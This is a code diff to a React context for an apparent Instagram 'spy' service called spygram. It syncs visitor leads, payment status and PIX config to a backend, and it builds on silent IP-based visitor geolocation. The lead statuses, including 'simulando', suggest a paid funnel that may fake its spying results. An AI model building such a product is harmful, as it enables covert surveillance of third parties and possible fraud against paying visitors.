@@ -176,6 +176,55 @@ export function AppProvider({ children }) {
     localStorage.setItem('spygram_credits', credits.toString());
   }, [credits]);
 
+  const refreshLeads = async () => {
+    try {
+      const res = await fetch('/api/leads');
+      if (res.ok) {
+        const data = await res.json();
+        if (data.db && Array.isArray(data.leads)) {
+          setLeads(data.leads);
+        }
+      }
+    } catch {
+      // Offline / local fallback
+    }
+  };
+
+  const syncLeadToApi = (lead) => {
+    fetch('/api/leads', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(lead)
+    }).catch(() => {});
+  };
+
+  const patchLeadStatusToApi = (leadId, status) => {
+    fetch(`/api/leads/${encodeURIComponent(leadId)}`, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ status })
+    }).catch(() => {});
+  };
+
+  const deleteLeadFromApi = (leadId) => {
+    fetch(`/api/leads/${encodeURIComponent(leadId)}`, {
+      method: 'DELETE'
+    }).catch(() => {});
+  };
+
+  // Load leads and shared PIX config from backend PostgreSQL on mount
+  useEffect(() => {
+    refreshLeads();
+    fetch('/api/config/pix_config')
+      .then((res) => (res.ok ? res.json() : null))
+      .then((data) => {
+        if (data?.db && data?.value?.key) {
+          localStorage.setItem('spygram_pix_config', JSON.stringify(data.value));
+        }
+      })
+      .catch(() => {});
+  }, []);
+
   // Try to detect visitor city via IPAPI silently
   useEffect(() => {
     const fetchGeo = async () => {
@@ -284,6 +333,7 @@ export function AppProvider({ children }) {
           setCurrentLeadId(newLeadId);
           setLeads(prev => [newLead, ...prev]);
           localStorage.setItem('spygram_current_lead_id', newLeadId);
+          syncLeadToApi(newLead);
           return newTarget;
         }
       }
@@ -327,6 +377,25 @@ export function AppProvider({ children }) {
     };
 
     setTargetUser(fallbackTarget);
+    const fallbackLeadId = 'lead-' + Date.now();
+    const fallbackLead = {
+      id: fallbackLeadId,
+      name: 'Visitante Não Identificado',
+      email: 'pendente@checkout.com',
+      phone: '(Pendente)',
+      cpf: 'Pendente',
+      target: cleanUsername,
+      targetPic: fallbackTarget.avatar,
+      city: visitorLocation.city,
+      state: visitorLocation.state,
+      amount: 27.90,
+      status: 'pesquisou',
+      createdAt: 'Agora mesmo'
+    };
+    setCurrentLeadId(fallbackLeadId);
+    setLeads(prev => [fallbackLead, ...prev]);
+    localStorage.setItem('spygram_current_lead_id', fallbackLeadId);
+    syncLeadToApi(fallbackLead);
     return fallbackTarget;
   };
 
@@ -334,6 +403,7 @@ export function AppProvider({ children }) {
   const confirmTargetProfile = () => {
     if (currentLeadId) {
       setLeads(prev => prev.map(l => l.id === currentLeadId ? { ...l, status: 'confirmou_alvo' } : l));
+      patchLeadStatusToApi(currentLeadId, 'confirmou_alvo');
     }
   };
 
@@ -341,6 +411,7 @@ export function AppProvider({ children }) {
   const markSimulating = () => {
     if (currentLeadId) {
       setLeads(prev => prev.map(l => l.id === currentLeadId ? { ...l, status: 'simulando' } : l));
+      patchLeadStatusToApi(currentLeadId, 'simulando');
     }
   };
 
@@ -388,6 +459,7 @@ export function AppProvider({ children }) {
       return [updatedLead, ...prev];
     });
 
+    syncLeadToApi(updatedLead);
     return updatedLead;
   };
 
@@ -397,16 +469,19 @@ export function AppProvider({ children }) {
     setCredits(prev => prev + 150);
     if (currentLeadId) {
       setLeads(prev => prev.map(l => l.id === currentLeadId ? { ...l, status: 'pagou' } : l));
+      patchLeadStatusToApi(currentLeadId, 'pagou');
     }
   };
 
   // Admin lead controls
   const updateLeadStatus = (leadId, newStatus) => {
     setLeads(prev => prev.map(l => l.id === leadId ? { ...l, status: newStatus } : l));
+    patchLeadStatusToApi(leadId, newStatus);
   };
 
   const deleteLead = (leadId) => {
     setLeads(prev => prev.filter(l => l.id !== leadId));
+    deleteLeadFromApi(leadId);
   };
 
   return (
@@ -418,6 +493,7 @@ export function AppProvider({ children }) {
         markSimulating,
         visitorLocation,
         leads,
+        refreshLeads,
         currentLeadId,
         isPaid,
         approvePayment,
